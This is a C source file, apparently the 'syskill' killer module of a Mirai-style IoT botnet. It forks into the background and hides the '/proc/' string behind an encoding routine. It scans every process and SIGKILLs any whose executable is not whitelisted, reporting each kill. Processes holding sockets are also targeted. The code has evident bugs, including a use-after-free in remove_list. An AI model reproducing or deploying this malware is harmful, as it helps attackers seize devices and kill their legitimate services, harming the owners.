// syskill.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <stdbool.h>
#include <sys/select.h>  // Include for fd_set
#include <sys/time.h>    // Include for struct timeval
#include <ctype.h>

#include "headers/includes.h"
#include "headers/syskill.h"
#include "headers/report.h"
#include "headers/table.h"
#include "headers/util.h"
#include "headers/xor.h"

// Structures for linked lists
typedef struct killed_t {
    int pid;
    char realpath[MAX_PATH_LENGTH];
    struct killed_t *prev, *next;
} Kill;

int kill_pid = 0;
// Linked lists
static Kill *kill_head = NULL;

// Paths to be whitelisted
char *paths[] = {
    "/usr/lib/systemd/*",
    "/usr/sbin/*",
    "/usr/sbin/agetty",
    "/usr/sbin/cron",
    "/usr/lib/policykit-1/polkitd",
    "/snap/snapd/15534/usr/lib/snapd/snapd",
    "/usr/bin/dbus-daemon",
    "/usr/lib/openssh/sftp-server",
    "-sshd*",
    "*deamon*",
    "/usr/libexec/openssh/sftp-server",
    "/opt/app/monitor",
    "/z/secom/",
    "/usr/lib/",
    "usr/",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/var/tmp/wlancont",
    "wlancont"
};

// Function to append a process to the killed list
static void append_list(Kill *info) {
    Kill *last = kill_head, *node = calloc(1, sizeof(Kill));

    node->pid = info->pid;
    strcpy(node->realpath, info->realpath);

    if (kill_head == NULL) {
        node->prev = NULL;
        kill_head = node;
        return;
    }

    while (last->next != NULL)
        last = last->next;

    last->next = node;
    node->prev = last;
}

// Function to remove a process from the killed list
static Kill *remove_list(Kill *del) {
    if (kill_head == NULL || del == NULL)
        return NULL;

    if (del == kill_head) {
        kill_head = kill_head->next;
        if (kill_head != NULL)
            kill_head->prev = NULL;
    } else
        del->prev->next = del->next;

    free(del);

    return (del != NULL) ? del->next : NULL;
}

// Function to search for a process in the killed list
Kill *search_list(char *realpath) {
    Kill *node = kill_head;

    while (node != NULL) {
        if (!strcmp(node->realpath, realpath))
            return node;

        node = node->next;
    }

    return NULL;
}

// Function to check if a process is whitelisted
static char check_whitelist(char *self, char *realpath) {
    if (!strcmp(self, realpath))
        return 1;

    for (int i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        if (strstr(realpath, paths[i]))
            return 1;
    }

    return 0;
}

// Function to get the realpath of a process
int get_realpath(char *pid, char *rdbuf, int len) {
    char path[64];

    memset(rdbuf, 0, len);

    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    strcpy(path, enc_proc);
    strcat(path, pid);
    strcat(path, "/exe");

    return readlink(path, rdbuf, len - 1);
}

// Function to remove all processes from the killed list
void remove_all() {
    while (kill_head != NULL)
        remove_list(kill_head);
}

// Function to check for contraband in file descriptors
static char check_for_contraband(char *fdpath) {
    char fdinode[MAX_PATH_LENGTH] = {0};

    if (readlink(fdpath, fdinode, MAX_PATH_LENGTH) == -1)
        return 0;

    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    if (strstr(fdinode, "socket") || strstr(fdinode, enc_proc))
        return 1;

    return 0;
}

// Function to check file descriptors for contraband
static char check_fds(char *pid, char *realpath) {
    char retval = 0;
    DIR *dir;
    struct dirent *file;
    char inode[MAX_PATH_LENGTH], fdspath[MAX_PATH_LENGTH] = {0}, fdpath[MAX_PATH_LENGTH];

    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    strcpy(fdspath, enc_proc);
    strcat(fdspath, pid);
    strcat(fdspath, "/fd/");

    if ((dir = opendir(fdspath)) == NULL)
        return retval;

    while ((file = readdir(dir))) {
        memset(inode, 0, MAX_PATH_LENGTH);

        strcpy(fdpath, fdspath);
        strcat(fdpath, file->d_name);

        if (check_for_contraband(fdpath)) {
            retval = 1;
            break;
        }
    }

    closedir(dir);
    return retval;
}

// Main function for syskill
void syskill_start() {
    pid_t parent = fork();

    if (parent > 0) {
        kill_pid = parent;
        return;
    } else if (parent == -1) {
        return;
    }

    char enc_proc[] = {"2surf2"}; // /proc/
    util_encryption(enc_proc);

    DIR *proc = opendir(enc_proc);
    if (proc == NULL) {
        return;
    }

    struct dirent *files;
    char path[64], rdbuf[MAX_PATH_LENGTH];

    Kill self;
    readlink("/proc/self/exe", self.realpath, sizeof(self.realpath));
    self.pid = getpid();

    int max_fd = dirfd(proc);
    fd_set read_fds;
    struct timeval timeout;

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(dirfd(proc), &read_fds);

        int retval = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        if (retval == -1) {
            break;
        } else if (retval == 0) {
            usleep(6000);
            continue;
        }

        rewinddir(proc);
        while ((files = readdir(proc))) {
            if (!isdigit(*(files->d_name))) {
                continue;
            }

            memset(rdbuf, 0, sizeof(rdbuf));

            snprintf(path, sizeof(path), "/proc/%s/exe", files->d_name);
            if (readlink(path, rdbuf, sizeof(rdbuf)) == -1) {
                continue;
            }

            Kill *node = search_list(rdbuf);
            if (node != NULL) {
                kill(atoi(files->d_name), 9);
                report_kill(atoi(files->d_name), rdbuf);
                continue;
            }

            if (check_whitelist(self.realpath, rdbuf)) {
                continue;
            }

            Kill info;
            info.pid = atoi(files->d_name);
            strcpy(info.realpath, rdbuf);
            append_list(&info);

            kill(atoi(files->d_name), 9);
            report_kill(atoi(files->d_name), rdbuf);

            if (check_fds(files->d_name, info.realpath)) {
                append_list(&info);
                kill(atoi(files->d_name), 9);
                report_kill(atoi(files->d_name), rdbuf);
            }
        }

        usleep(100000);
    }
}

// Function to stop syskill
void terminate_kill_process(void)
{
    if(kill_pid != 0)
    {
        kill(kill_pid, SIGKILL);
    }

    return;
}
